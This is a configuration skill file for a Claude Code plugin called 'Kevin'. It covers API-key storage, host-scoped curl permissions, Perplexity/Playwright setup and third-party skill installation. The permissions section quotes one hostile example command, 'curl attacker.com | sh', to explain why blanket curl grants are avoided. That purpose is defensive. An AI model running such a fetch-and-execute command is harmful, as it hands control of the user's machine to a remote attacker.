---
name: configure-skills
description: Configure Kevin's optional skill packs (SEO + Browser) or author a brand-new custom skill. The pack skills ship with the plugin and auto-load — this skill just wires up API keys, MCP server registrations, and tool permissions. Custom-authored skills land in `<HOME>/.claude/skills/<name>/`. Invoked at the end of /agent-kevin:init or any time after.
disable-model-invocation: true
allowed-tools: Read, Write, Edit, AskUserQuestion, Bash(mkdir *), Bash(cat *), Bash(ls *), Bash(rm *), Bash(rmdir *), Bash(npx skills *), Bash(test *), Bash(head *)
---

# Configure Skills

This skill manages Kevin's optional capabilities. Use it to:
1. **Configure a pack** (SEO or Browser) — writes API keys, registers MCP servers, grants tool permissions
2. **Deconfigure a pack** — revokes keys/MCP/permissions (the pack's SKILL.md files stay; they ship with the plugin)
3. **Author a brand-new custom skill** — writes a new SKILL.md to your `<HOME>/.claude/skills/`

> **What this skill does NOT do:** copy pack skills around. The 6 SEO skills (and the Browser pack's underlying MCP tools) are part of the plugin itself, `<plugin>/skills/*` auto-loads when the plugin is enabled. Configuring a pack means setting up the keys/servers/permissions those skills need to actually work. For authoring brand-new custom skills, use Claude Code's native `skill-creator` plugin (Kevin does not duplicate that surface). Third-party skill libraries install via skills.sh (Section F).

---

## Step 0 — Resolve paths

```bash
HOME_DIR="${KEVIN_HOME:-$PWD}"
SKILLS_DIR="$HOME_DIR/.claude/skills"
PROJECT_SETTINGS="$HOME_DIR/.claude/settings.json"
SETTINGS_FILE="$HOME_DIR/.claude/settings.local.json"
MCP_FILE="$HOME_DIR/.mcp.json"

mkdir -p "$HOME_DIR/.claude"
```

**File-purpose summary** (wrong file = leaked secrets or unportable config):

- `$PROJECT_SETTINGS` → permission allow-list (so configured tools don't trigger a confirm prompt on each use). Committable, non-secret.
- `$SETTINGS_FILE` → API keys + other secrets in an `env` block. **Gitignored.**
- `$MCP_FILE` → `<HOME>/.mcp.json` at the project root (NOT inside `.claude/`). Claude Code reads project MCP servers from this exact location. A file at `.claude/mcp.json` is silently ignored.
- `$SKILLS_DIR` → where third-party skill libraries (Section F) land. Pack skills do NOT live here, they live in the plugin source.

If `$HOME_DIR/CLAUDE.md` doesn't exist, tell the user to run `/agent-kevin:init` first, then stop.

---

## Step 1 — Pick what to do

`AskUserQuestion`:

> **What would you like to do?**
> - Configure a skill pack (SEO / Browser)
> - Install third-party skill libraries (via skills.sh)
> - Deconfigure a skill pack
> - Cancel

Branch into the matching section below. For authoring brand-new custom skills (not in this plugin and not on skills.sh), use Claude Code's native [`skill-creator`](https://github.com/anthropics/claude-plugins-official) plugin — Kevin does not duplicate that surface.

---

## Section A — Configure a skill pack

### A.1 Pick pack(s)

`AskUserQuestion` (**multi-select**):

> **Which pack(s) to configure?** Tick any combination.
>
> - ☐ SEO — 6 SEO skills + the `google-search-audit` composite (already loaded; this walks API key + permission setup)
> - ☐ Browser — Perplexity research + Playwright tool permissions
> - ☐ Third-party libraries — clone separately-authored skill libraries (e.g. SEO/GEO from `aaron-he-zhu`, marketing playbooks from `coreyhaines31`) into `<HOME>/.claude/skills/`. Apache-2.0 licensed.

If nothing is ticked, cancel and return to Step 1. Otherwise run the matching sub-section(s) below in order: SEO (A.2a) → Browser (A.2b) → Third-party (Section F).

### A.2a — SEO pack walk

**Tool-name prefix convention** — important: the plugin bundles two MCP servers (`kevin` and `perplexity`), so all their tools use the **plugin-namespaced** prefix `mcp__plugin_agent-kevin_<server>__<tool>` (e.g., `mcp__plugin_agent-kevin_kevin__serpapi_search`, `mcp__plugin_agent-kevin_perplexity__perplexity_search`). The shorter `mcp__kevin__<tool>` or `mcp__perplexity__<tool>` forms look correct but won't match anything at runtime — Claude Code prefixes plugin-provided servers with `plugin_<plugin-name>_<server-name>`. Tools from servers registered in `<HOME>/.mcp.json` (none required by Kevin's first-party packs) would use the plain `mcp__<server>__<tool>` form. The "Permissions to grant" column below uses the correct form for each.

| Skill | Backed by | Required key(s) | Extra permission to grant |
|---|---|---|---|
| `serpapi` | `mcp__plugin_agent-kevin_kevin__serpapi_search` | `SERPAPI_KEY` (https://serpapi.com) | _already granted by `/init`_ |
| `open-page-rank` | `mcp__plugin_agent-kevin_kevin__open_page_rank` | `OPENPAGERANK_API_KEY` (https://openpagerank.com) | _already granted by `/init`_ |
| `google-search-console` | `mcp__plugin_agent-kevin_kevin__gsc_*` | Google OAuth + `GSC_SITE_URL` | _already granted by `/init`_ |
| `google-page-speed` | `mcp__plugin_agent-kevin_kevin__page_speed_*` | Google OAuth (shared with GSC) | _already granted by `/init`_ |
| `wordpress-rest` | direct `curl` | none | `Bash(curl https://<host>/*)` + `Bash(curl * https://<host>/*)`, where `<host>` is derived from `GSC_SITE_URL`. Only granted if `google-search-console` was configured this run (so `GSC_SITE_URL` is set). Otherwise curl confirms per-call. |
| `google-search-audit` | composite (uses tools above) | shares the keys above | _already granted by `/init`_ |

**Plugin-bundled MCP tools are pre-granted by `/agent-kevin:init`** — that flow writes all `mcp__plugin_agent-kevin_*` entries (both `_kevin__*` and `_perplexity__*`) into `$PROJECT_SETTINGS` → `permissions.allow` at scaffold time. This skill only handles non-plugin configuration: API keys for the bundled servers (`SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL`, `PERPLEXITY_API_KEY`), Google OAuth flow for GSC/PSI, and **host-scoped** curl grants for `wordpress-rest` (derived from `GSC_SITE_URL` so they're locked to the user's actual site, not blanket `Bash(curl *)` which would authorise arbitrary network requests like `curl attacker.com | sh`).

Walk the 4 skills that *need keys* one at a time (`serpapi`, `open-page-rank`, `google-search-console`, `google-page-speed`). For each, `AskUserQuestion`:

> **Configure `<skill-name>`?**
> Description: `<one-line summary from the SKILL.md frontmatter>`
> Requires: `<key name(s)>`
>
> - Yes, set up the key now
> - Skip (key absent — the skill stays callable but tool calls will error until configured)

If yes:
- For env-var keys (`SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL`): ask for the value, write to `$SETTINGS_FILE` env block (§D).
- For Google OAuth: walk the user through obtaining a client JSON, then placing it. Surface these steps verbatim:
  1. Open [Google Cloud Console → APIs & Services → Credentials](https://console.cloud.google.com/apis/credentials).
  2. Pick (or create) a project. Under **Library**, enable the **Search Console API** and **PageSpeed Insights API**.
  3. **Credentials** → **Create Credentials** → **OAuth client ID** → application type **Desktop app** → Create → download the JSON.
  4. Move the file to `$HOME_DIR/.kevin/config/google-oauth-client.json` (`mkdir -p` the dir if missing).
  5. Inside Claude Code, run `mcp__plugin_agent-kevin_kevin__google_auth`. A browser tab opens, the user grants access, the refresh token is minted and persisted alongside the client JSON.

  After that, all `gsc_*` and `page_speed_*` tools work without re-prompting.

> **Note on key values in chat:** when the user pastes a key into the chat, the value enters the session transcript. The session-capture hook redacts known-key values (anything in `$SETTINGS_FILE` `env`) and common key prefixes (`sk-…`, `pplx-…`, `AIza…`, `sk-ant-…`, `gh[pous]_…`) before writing the transcript to `knowledge/raw/sessions/`. So keys are scrubbed from the persisted log even if pasted in chat. The redaction is exact-match against the values stored in `settings.local.json`, so once a key is saved, all future captures will redact it deterministically.

**For `wordpress-rest`:** if `GSC_SITE_URL` was set this run (the user configured `google-search-console`), derive the bare host and grant two scoped curl patterns via §E. This lets `wordpress-rest` call the user's own WP REST endpoints without re-prompting, without authorising curl to arbitrary hosts. Pure-prompt third-party SEO/content skills (e.g., `content-quality-auditor`, `seo-content-writer`) are NOT bundled with this plugin — install them via Section F if you want them.

```bash
# Normalise GSC_SITE_URL into a bare host. Handles both forms GSC accepts:
#   "sc-domain:example.com"   → "example.com"
#   "https://example.com/"    → "example.com"
HOST="${GSC_SITE_URL#sc-domain:}"
HOST="${HOST#https://}"
HOST="${HOST#http://}"
HOST="${HOST%%/*}"
```

Then via §E, add to `$PROJECT_SETTINGS` → `permissions.allow`:
- `Bash(curl https://<HOST>/*)` — naked curl invocation
- `Bash(curl * https://<HOST>/*)` — curl with one or more flags before the URL (e.g. `curl -sS -f https://<HOST>/wp-json/...`)

If `GSC_SITE_URL` is NOT set (user skipped GSC config), skip the curl grant — wordpress-rest's calls will confirm per-call and the user can "Always allow" the specific pattern manually.

After all keyed skills processed, print a summary:

```
✅ SEO pack configured.

Keys provided:    <list of the 3 env keys actually set>
Keys still missing: <list — re-run /agent-kevin:configure-skills when you get them>
Google OAuth:     <ready | needs `mcp__plugin_agent-kevin_kevin__google_auth` after dropping the client JSON>
Permissions granted: <count> entries in .claude/settings.json
```

### A.2b — Browser pack walk

The Browser pack is one piece of configuration: the **Perplexity API key**. The Perplexity MCP server is plugin-bundled (registered in the plugin's own `.mcp.json` as the `perplexity` server, surfacing as `mcp__plugin_agent-kevin_perplexity__perplexity_search`), so it auto-loads on every session — but it stays inert until `PERPLEXITY_API_KEY` lands in the env block of `$SETTINGS_FILE`. Tool permission was pre-granted by `/init`. (Playwright tools are part of the plugin's own MCP and already grant-able via permissions.)

**(1) Perplexity** — `mcp__plugin_agent-kevin_perplexity__perplexity_search`.

`AskUserQuestion`:

> **Set Perplexity API key?**
> Sign up at https://perplexity.ai/settings/api for an API key. The MCP server is already wired into the plugin and granted permissions by `/init` — this step just provides the key so calls actually succeed.
>
> - Yes, provide the key now
> - Skip (server stays inert until you set `PERPLEXITY_API_KEY` later)

If installing: write `PERPLEXITY_API_KEY=<value>` into `$SETTINGS_FILE` env block (§D). **Do not** touch `$MCP_FILE` — perplexity is plugin-bundled, not project-registered.

**(2) Playwright** — `mcp__plugin_agent-kevin_kevin__playwright_{screenshot,pdf,record}` tools.

Nothing to configure — these are part of the plugin's own MCP and permissions for them were granted by `/init`. Just verify the chromium binary is in place (the plugin's postinstall handles this):

```bash
bunx playwright --version 2>&1 || echo "PLAYWRIGHT_MISSING"
```

If `PLAYWRIGHT_MISSING`, tell the user:

```
Playwright isn't on the path — finish the plugin's initial install:
  cd ${CLAUDE_PLUGIN_ROOT}/mcp-server && bun install
If chromium download fails (macOS sandbox/XPC walls), run that command in a normal terminal outside Claude Code.
```

After both pieces processed, print Browser pack summary.

---

## Section F — Install third-party skill libraries

The plugin ships AgentLayer-authored skills only. For community-maintained skill libraries, defer to **[skills.sh](https://skills.sh)** — a cross-agent skill registry (Claude Code, Codex, Cursor, Copilot, Windsurf) maintained by Vercel Labs. One CLI, registry-tracked versions, symlink-based installs so upstream updates propagate automatically.

The install command is:

```bash
cd "$HOME_DIR"
npx skills add <owner/repo> -a claude-code -y
```

What that does:
- `-a claude-code` — target Claude Code's skill format only
- `-y` — skip confirmation prompts (we already asked via `AskUserQuestion`)
- Default install (no `-g`) → project-scope, lands in `$HOME_DIR/.claude/skills/` because that's the current `cwd`
- Symlinks by default → upstream updates propagate via the skills.sh CLI's own update flow without re-walking this section

### F.1 Pick libraries

`AskUserQuestion` (**multi-select**):

> **Which third-party skill libraries to install?**
> Installed via [skills.sh](https://skills.sh) into `<HOME>/.claude/skills/`. Each library's upstream LICENSE travels with the install.
>
> - ☐ **`aaron-he-zhu/seo-geo-claude-skills`** (Apache-2.0) — 20-skill SEO + GEO library: `content-quality-auditor` (80-item CORE-EEAT audit), `seo-content-writer`, `content-refresher`, `domain-authority-auditor`, and more.
> - ☐ **`coreyhaines31/marketingskills`** (check upstream LICENSE) — 23 marketing playbooks: CRO, SEO, copy, analytics, experiments, pricing, launches, ads, social.

If nothing ticked, return to Step 1.

### F.2 Per-library install

For each ticked library:

```bash
cd "$HOME_DIR" && npx skills add <owner/repo> -a claude-code -y
```

Capture the CLI's output. On success it lists the skills it installed and the destination paths. On failure (network, npm cache permission, missing repo) — surface the error to the user, suggest manual `npx skills list <owner/repo>` to verify the repo + permissions, and move on to the next ticked library.

### F.3 Show what landed

After all installs, run:

```bash
ls -la "$HOME_DIR/.claude/skills/" | grep -v '^total' | tail -n +2
```

And for each newly-installed skill, show its LICENSE provenance:

```bash
for sym in "$HOME_DIR/.claude/skills"/*; do
  if [ -L "$sym" ]; then
    target=$(readlink "$sym")
    license_line=$(test -f "$target/../LICENSE" && head -1 "$target/../LICENSE" || echo "(no LICENSE at upstream root)")
    echo "$(basename "$sym")  →  $target"
    echo "    license: $license_line"
  fi
done
```

(skills.sh installs as symlinks, so `readlink` reveals where the underlying clone lives in the skills.sh cache — useful for the user to inspect or `git pull` manually.)

### F.4 Update / uninstall semantics

- **Update an installed library**: re-run `npx skills add <owner/repo> -a claude-code -y` from `$HOME_DIR`. skills.sh pulls latest upstream into its cache; the symlink in `<HOME>/.claude/skills/` keeps pointing at the same path, so the freshness shows immediately.
- **Uninstall a library**: `npx skills remove <owner/repo> -a claude-code` (if supported), or fall back to deleting the symlinks: `rm "$HOME_DIR/.claude/skills/<skill-name>"`. The skills.sh cache stays; that's fine — it's reusable.
- **List installed**: `npx skills list` from `$HOME_DIR`.

### F.5 Trust model

> By installing a third-party library you're accepting that its skill bodies execute in your session with your `permissions.allow` grants. skills.sh maintains a leaderboard and metadata but does not vet skill behavior. Treat each `npx skills add` like a package install — read the LICENSE, scan the SKILL.md files, prefer libraries that pin versions / have active maintenance.

### F.6 Summary

Print per library: install status + symlink path + upstream LICENSE first-line. Remind the user the symlink means upstream changes flow through on next `npx skills add` of the same repo (or whenever skills.sh's CLI runs its update cycle).

---


## Section C — Deconfigure a skill pack

### C.1 Pick pack to deconfigure

`AskUserQuestion`:

> **Which pack's configuration to remove?**
> - SEO (clears API keys + permissions; skill files stay loaded but tool calls will error)
> - Browser (removes the Perplexity API key; the MCP server stays plugin-bundled but goes inert without the key. Playwright tools stay since they're built-in)

### C.2 Deconfigure actions

**SEO deconfigure:**
- Revoke any `Bash(curl https://<host>/*)` or `Bash(curl * https://<host>/*)` entries from `$PROJECT_SETTINGS` → `permissions.allow` (§E remove helper) — those were the host-scoped curl grants written when SEO was configured. To know which host, read `GSC_SITE_URL` from `$SETTINGS_FILE` before deleting it (next step) and normalise the same way the configure flow did. If `GSC_SITE_URL` is already gone, fall back to scanning `permissions.allow` for any entry matching `Bash(curl *)` and ask the user before removing.
- Do **not** revoke the `mcp__plugin_agent-kevin_kevin__*` entries — those are the plugin baseline from `/init`.
- `AskUserQuestion`: "Also remove `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, `GSC_SITE_URL` from `$SETTINGS_FILE`?" (Yes/No)
- If yes: read `$SETTINGS_FILE`, delete those keys from `env`, write back.

**Browser deconfigure:**
- `AskUserQuestion`: "Remove `PERPLEXITY_API_KEY` from `$SETTINGS_FILE`?" (Yes/No). If yes, delete via §D.
- Do **not** touch `$MCP_FILE` and do **not** revoke `mcp__plugin_agent-kevin_perplexity__perplexity_search` — both are plugin baseline (registration via the plugin's own `.mcp.json`, permission written by `/init`). The server stays loaded but inert without the key, which is what "deconfigured" means here.
- Remind user: playwright + chromium stay installed (part of plugin base deps).

Print summary of what was removed.

---

## Section D — Helper: write keys to `settings.local.json`

To write `KEY=value` to `$SETTINGS_FILE`'s env block:

1. Read existing file. If it doesn't exist, start with `{}`.
2. Ensure `.env` is an object — initialize if missing.
3. Set `env[KEY] = value`.
4. Write back with 2-space indent.

Example final shape:

```json
{
  "env": {
    "SERPAPI_KEY": "...",
    "OPENPAGERANK_API_KEY": "...",
    "GSC_SITE_URL": "https://example.com/",
    "PERPLEXITY_API_KEY": "pplx-..."
  }
}
```

Claude Code loads this file when opening CC in `$HOME_DIR` (or any subdirectory). Keys become env vars in every CC session there.

To remove a key: same flow, `delete env[KEY]`. If `env` ends up empty, you can remove the `env` key or leave it as `{}` — both work.

---

## Section E — Helper: grant/revoke tool permissions in `settings.json`

When a pack/skill is configured, write its tools into `$PROJECT_SETTINGS` → `permissions.allow` so Claude Code stops asking the user to confirm each call.

**Grant** (add entries — dedup, preserve existing):

1. Read `$PROJECT_SETTINGS`. If it doesn't exist, start with `{}`. If it exists from `/agent-kevin:init`, it'll already have `extraKnownMarketplaces` and `enabledPlugins` — preserve them.
2. Ensure `permissions` is an object and `permissions.allow` is an array — initialize if missing.
3. For each entry in the input list: if it's **not already** in `permissions.allow`, push it. Don't add duplicates.
4. Sort `permissions.allow` alphabetically (deterministic diffs).
5. Write back with 2-space indent.

Example final shape (`/init` baseline + SEO with `GSC_SITE_URL=https://example.com/`). The `mcp__plugin_agent-kevin_*` entries (including `mcp__plugin_agent-kevin_perplexity__perplexity_search` since perplexity is plugin-bundled) and the read-mostly Bash patterns are written by `/init`; this skill appends host-scoped curl (when SEO is configured). Browser configuration only touches `$SETTINGS_FILE` env (the API key) — no permissions diff here:

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "extraKnownMarketplaces": { "agentlayer": { "source": { "source": "directory", "path": "/path/to/plugin" } } },
  "enabledPlugins": { "agent-kevin@agentlayer": true },
  "permissions": {
    "allow": [
      "Bash(cat *)",
      "Bash(curl * https://example.com/*)",
      "Bash(curl https://example.com/*)",
      "Bash(date)",
      "Bash(date *)",
      "Bash(echo *)",
      "Bash(find *)",
      "Bash(git config user.email)",
      "Bash(git config user.name)",
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(git status)",
      "Bash(git status *)",
      "Bash(ls)",
      "Bash(ls *)",
      "Bash(mkdir -p *)",
      "Bash(readlink *)",
      "Bash(test *)",
      "mcp__plugin_agent-kevin_kevin__compile_next",
      "mcp__plugin_agent-kevin_kevin__compile_status",
      "mcp__plugin_agent-kevin_kevin__compile_write",
      "mcp__plugin_agent-kevin_kevin__google_auth",
      "mcp__plugin_agent-kevin_kevin__gsc_inspect",
      "mcp__plugin_agent-kevin_kevin__gsc_query",
      "mcp__plugin_agent-kevin_kevin__gsc_sites",
      "mcp__plugin_agent-kevin_kevin__links_rewrite",
      "mcp__plugin_agent-kevin_kevin__memory_prune",
      "mcp__plugin_agent-kevin_kevin__open_page_rank",
      "mcp__plugin_agent-kevin_kevin__page_speed_audit",
      "mcp__plugin_agent-kevin_kevin__page_speed_psi",
      "mcp__plugin_agent-kevin_kevin__ping",
      "mcp__plugin_agent-kevin_kevin__playwright_pdf",
      "mcp__plugin_agent-kevin_kevin__playwright_record",
      "mcp__plugin_agent-kevin_kevin__playwright_screenshot",
      "mcp__plugin_agent-kevin_kevin__serpapi_search",
      "mcp__plugin_agent-kevin_kevin__task_close",
      "mcp__plugin_agent-kevin_kevin__task_create",
      "mcp__plugin_agent-kevin_kevin__task_get",
      "mcp__plugin_agent-kevin_kevin__task_query",
      "mcp__plugin_agent-kevin_kevin__task_scan",
      "mcp__plugin_agent-kevin_kevin__task_thread",
      "mcp__plugin_agent-kevin_kevin__task_update",
      "mcp__plugin_agent-kevin_perplexity__perplexity_search"
    ]
  }
}
```

**Prefix rule** (use this whenever you need to know how a tool surfaces to permissions.allow):
- Plugin-bundled MCP tools (from the plugin's own `.mcp.json` → any `mcpServers.<name>`): `mcp__plugin_agent-kevin_<server>__<tool>`. The plugin bundles two servers: `kevin` (the in-house MCP, 24 tools) and `perplexity` (the upstream `@perplexity-ai/mcp-server`, 1 tool). Both surface under this prefix.
- Standalone MCP servers registered in `<HOME>/.mcp.json` (none required by Kevin's first-party packs, but users can add their own): `mcp__<server>__<tool>`

**Revoke** (remove entries — deconfigure path):

1. Read `$PROJECT_SETTINGS`. If `permissions.allow` doesn't exist, no-op.
2. Filter out the entries to revoke. Keep the array sorted.
3. If `permissions.allow` ends up empty, you can leave `[]` or drop the `permissions` block — both work.
4. Write back.

**Why `settings.json` (not `settings.local.json`):** these aren't secrets — they're "the user opted into this pack, so its tools shouldn't trigger a confirm prompt." Putting them in `settings.json` keeps them committable (no harm in sharing across machines if the user clones their Kevin home).

---

## Notes

- **Pack skills are plugin-bundled.** They live in `<plugin>/skills/` and load whenever the plugin is enabled. This skill never copies them — copying would mean stale forks that don't get plugin updates. Section C ("Deconfigure") removes the configuration (keys, MCP, permissions) but cannot remove the skill markdown files themselves — those go with the plugin.
- **Idempotent.** Re-running configure for the same pack: ask whether to update keys/permissions or skip. Re-running with new env values overwrites previous.
- **No secrets in stdout/stderr.** When asking for an API key, don't echo it back in confirmation messages — just say "Key saved." Logs that pass through stderr should never carry the key value.
- **Project-scoped keys.** `settings.local.json` is gitignored by Claude Code's defaults. If the user has their `$HOME_DIR` in a git repo, double-check `.gitignore` includes `.claude/settings.local.json`.
- **Third-party libraries (Section F) install via skills.sh** into `<HOME>/.claude/skills/` as symlinks into the skills.sh cache. Restart Claude Code (or `/reload-skills`) to load.
- **Custom skill authoring** lives in Claude Code's native `skill-creator` plugin, not here.
